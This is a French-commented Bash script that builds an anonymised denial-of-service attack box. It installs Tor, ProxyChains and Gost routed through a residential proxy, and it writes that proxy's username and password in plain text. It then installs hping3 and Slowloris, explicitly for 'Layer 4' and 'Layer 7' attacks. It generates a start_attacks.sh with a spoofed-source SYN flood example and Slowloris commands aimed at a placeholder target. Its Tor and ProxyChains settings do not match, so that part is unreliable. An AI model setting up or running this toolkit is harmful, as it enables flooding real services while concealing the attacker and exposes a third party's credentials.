#!/bin/bash

set -euo pipefail

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
cd "$SCRIPT_DIR"

echo "=== Démarrage de l'installation spoof ==="
echo ""

# Mise à jour du système
apt update && apt upgrade -y

# Installation des dépendances
apt install -y curl wget git python3 python3-pip python3-venv build-essential libssl-dev libffi-dev python3-dev openjdk-11-jdk

# Installation de Tor pour le spoofing
apt install -y tor

# Configuration de Tor
mkdir -p /etc/tor
cat <<EOF > /etc/tor/torrc
SocksPort 0
ControlPort 9051
CookieAuthentication 1
EOF

# Redémarrage de Tor
systemctl restart tor

# Installation de ProxyChains
if [ -d "proxychains" ]; then
    rm -rf proxychains
fi
git clone https://github.com/haad/proxychains.git
cd proxychains
./configure --prefix=/usr --sysconfdir=/etc
make
make install
ldconfig
cd "$SCRIPT_DIR"

# Configuration de ProxyChains
cat <<EOF > /etc/proxychains.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9051
EOF

# Installation de Go (version 1.22 pour compatibilité avec Gost)
if [ -d "/usr/local/go" ]; then
    rm -rf /usr/local/go
fi
if [ ! -f "go1.22.0.linux-amd64.tar.gz" ]; then
    wget https://golang.org/dl/go1.22.0.linux-amd64.tar.gz
fi
tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
export GOBIN=$GOPATH/bin
mkdir -p "$GOPATH/bin"

# Installation de Gost
if [ -d "gost" ]; then
    rm -rf gost
fi
git clone https://github.com/ginuerzh/gost.git
cd gost
# Vérification de la version de Go
if ! go version | grep -q "go1.2[1-9]\|go1.[3-9]"; then
    echo "Erreur: Go 1.21+ est requis pour compiler Gost"
    echo "Version actuelle: $(go version)"
    exit 1
fi
# Correction du problème de module obfs4
if grep -q "git.torproject.org/pluggable-transports/obfs4.git" go.mod 2>/dev/null; then
    go mod edit -replace=git.torproject.org/pluggable-transports/obfs4.git=gitlab.com/yawning/obfs4.git@latest
fi
# Nettoyage et téléchargement des dépendances
go mod download
go mod tidy
# Compilation
if go build -o gost ./cmd/gost; then
    cp gost /usr/local/bin/gost
    chmod +x /usr/local/bin/gost
    echo "Gost compilé et installé avec succès"
else
    echo "Erreur: La compilation de gost a échoué"
    exit 1
fi
cd "$SCRIPT_DIR"

# Configuration de Gost pour utiliser le proxy fourni
mkdir -p /etc/gost
cat <<EOF > /etc/gost/gost.conf
[
    {
        "name": "http",
        "listen": ":8080",
        "type": "http",
        "proxy": "http://geo.iproyal.com:12321",
        "auth": {
            "user": "fa6woTeBNjLAF6En",
            "pass": "PjukuUhi8DLXx848"
        }
    }
]
EOF

# Démarrage de Gost (en arrière-plan)
if command -v gost &> /dev/null; then
    pkill -f "gost -c /etc/gost/gost.conf" || true
    nohup gost -c /etc/gost/gost.conf > /var/log/gost.log 2>&1 &
    echo "Gost démarré en arrière-plan"
else
    echo "Attention: gost n'est pas installé, le démarrage sera ignoré"
fi

# Installation de Cloudflare-Speedtest
echo "Installation de CloudflareSpeedtest avec venv..."
if [ -d "/opt/CloudflareSpeedtest" ]; then
    rm -rf /opt/CloudflareSpeedtest
fi
if [ -d "CloudflareSpeedtest" ]; then
    rm -rf CloudflareSpeedtest
fi
git clone https://github.com/XIU2/CloudflareSpeedtest.git /opt/CloudflareSpeedtest
cd /opt/CloudflareSpeedtest
# Création de l'environnement virtuel
python3 -m venv venv
source venv/bin/activate
# Mise à jour de pip dans le venv
pip install --upgrade pip
# Installation des dépendances
if [ -f "requirements.txt" ]; then
    pip install -r requirements.txt || pip install cloudscraper requests
else
    pip install cloudscraper requests
fi
deactivate
cd "$SCRIPT_DIR"
echo "✓ CloudflareSpeedtest installé avec venv"

# Installation de Ubooquity
echo "Installation de Ubooquity..."
if [ ! -f "ubooquity.jar" ]; then
    if wget -O ubooquity.jar https://github.com/harbourmaster/ubooquity/releases/download/v2.3.0/ubooquity-2.3.0.jar; then
        echo "✓ Ubooquity téléchargé"
    else
        echo "⚠ Erreur lors du téléchargement d'Ubooquity (peut être ignoré)"
    fi
fi
if [ -f "ubooquity.jar" ]; then
    chmod +x ubooquity.jar
    mkdir -p /opt/ubooquity
    cp ubooquity.jar /opt/ubooquity/
    echo "✓ Ubooquity installé dans /opt/ubooquity"
fi

# Installation de Nginx pour le reverse proxy
apt install -y nginx

# Configuration de Nginx
cat <<EOF > /etc/nginx/sites-available/default
server {
    listen 80;
    server_name _;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

# Redémarrage de Nginx
systemctl restart nginx

# Installation de Hping3 pour les attaques Layer 4
apt install -y hping3

# Installation de Slowloris pour les attaques Layer 7
echo "Installation de Slowloris avec venv..."
if [ -d "/opt/slowloris" ]; then
    rm -rf /opt/slowloris
fi
if [ -d "slowloris" ]; then
    rm -rf slowloris
fi
git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
cd /opt/slowloris
# Création de l'environnement virtuel
python3 -m venv venv
source venv/bin/activate
# Mise à jour de pip dans le venv
pip install --upgrade pip
# Installation des dépendances
if [ -f "requirements.txt" ]; then
    pip install -r requirements.txt
fi
deactivate
cd "$SCRIPT_DIR"
echo "✓ Slowloris installé avec venv"

# Script pour lancer les attaques
cat <<EOF > /usr/local/bin/start_attacks.sh
#!/bin/bash

# Exemple d'utilisation de Hping3 pour une attaque SYN Flood
# hping3 -S -p 80 -i u10000 -a 192.168.1.1 target_ip

# Exemple d'utilisation de Slowloris pour une attaque Layer 7 (avec venv)
# cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip && deactivate

# Exemple d'utilisation de CloudflareSpeedtest (avec venv)
# cd /opt/CloudflareSpeedtest && source venv/bin/activate && python3 cfst.py [options] && deactivate

# Remplacez target_ip par l'adresse IP de la cible
echo "Script d'attaque - Modifiez ce script avec votre cible avant utilisation"
echo ""
echo "Pour utiliser Slowloris avec venv:"
echo "  cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip"
echo ""
echo "Pour utiliser CloudflareSpeedtest avec venv:"
echo "  cd /opt/CloudflareSpeedtest && source venv/bin/activate && python3 cfst.py [options]"
EOF

# Création d'un wrapper pour slowloris avec venv
cat <<EOF > /usr/local/bin/slowloris
#!/bin/bash
cd /opt/slowloris
source venv/bin/activate
python3 slowloris.py "\$@"
deactivate
EOF
chmod +x /usr/local/bin/slowloris

# Création d'un wrapper pour CloudflareSpeedtest avec venv
cat <<EOF > /usr/local/bin/cloudflarespeedtest
#!/bin/bash
cd /opt/CloudflareSpeedtest
source venv/bin/activate
python3 cfst.py "\$@"
deactivate
EOF
chmod +x /usr/local/bin/cloudflarespeedtest

# Rendre le script exécutable
chmod +x /usr/local/bin/start_attacks.sh

echo ""
echo "=== Installation terminée avec succès ==="
echo ""
echo "Outils installés :"
echo "  - Tor: /usr/bin/tor"
echo "  - ProxyChains: /usr/bin/proxychains4"
echo "  - Gost: /usr/local/bin/gost (démarré en arrière-plan)"
echo "  - CloudflareSpeedtest: /opt/CloudflareSpeedtest (avec venv)"
echo "  - Slowloris: /opt/slowloris (avec venv)"
echo "  - Hping3: /usr/bin/hping3"
echo "  - Nginx: /etc/nginx"
echo ""
echo "Wrappers disponibles (utilisent automatiquement les venvs) :"
echo "  - slowloris: /usr/local/bin/slowloris"
echo "  - cloudflarespeedtest: /usr/local/bin/cloudflarespeedtest"
echo ""
echo "Scripts disponibles :"
echo "  - Attaques: /usr/local/bin/start_attacks.sh"
echo ""
echo "Utilisation des outils Python :"
echo "  - Utilisez les wrappers: slowloris target_ip"
echo "  - Ou manuellement: cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip"
echo ""
echo "Pour vérifier l'installation, exécutez : ./verify-spoof.sh"
echo "Pour nettoyer l'installation, exécutez : ./cleanup-spoof.sh"